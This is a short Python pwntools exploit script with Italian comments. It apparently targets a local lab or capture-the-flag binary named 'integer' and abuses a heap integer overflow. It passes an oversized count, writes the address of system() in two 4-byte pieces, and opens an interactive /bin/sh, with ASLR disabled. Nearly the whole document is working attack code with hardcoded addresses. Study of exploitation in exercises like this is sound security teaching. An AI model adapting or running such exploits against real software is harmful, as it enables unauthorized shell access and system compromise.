from pwn import *

#Questo exploit si basa sulla vulnerabilità di tipo Integer Overflow nell'heap.
# Ha bisogno di ASLR disabilitato.

def main():
    e = ELF('../Machines/integer')
    context.binary = e
    arg1 = int('0xffffffff', 16)
    p = process([e.path, str(arg1/4+1), '/bin/sh'])

    sys_addr_1 = str(int('f7e1a290', 16)).encode()
    sys_addr_2 = str(int('7fff', 16)).encode()
    
    for _ in range(0, 8):
        p.recvuntil(b'> ')
        p.sendline(str(_+2).encode())
    p.recvuntil(b'> ')
    p.sendline(sys_addr_1) #invio dell'indirizzo della funzione system() in due tranch (è possibile inviare solo 4 byte per volta)
    p.recvuntil(b'> ')
    p.sendline(sys_addr_2) #invio seconda tranch
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.interactive()


if __name__ == '__main__':
    main()